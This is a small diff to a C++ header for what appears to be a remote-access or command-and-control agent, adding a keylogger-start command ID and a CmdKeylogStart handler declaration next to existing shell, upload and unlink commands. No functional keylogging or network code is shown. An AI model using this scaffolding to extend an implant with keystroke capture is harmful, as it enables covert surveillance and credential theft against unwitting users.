@@ -32,6 +32,8 @@
 #define COMMAND_SHELL_ACEPT  74
 
 
+#define COMMAND_KEYLOG_START 80
+
 #define COMMAND_SAVEMEMORY 0x2321
 #define COMMAND_ERROR      0x1111ffff
 
@@ -82,6 +84,7 @@ public:
 	void CmdUnlink(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker);
 
+	void CmdKeylogStart(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void Exit(Packer* outPacker);
 
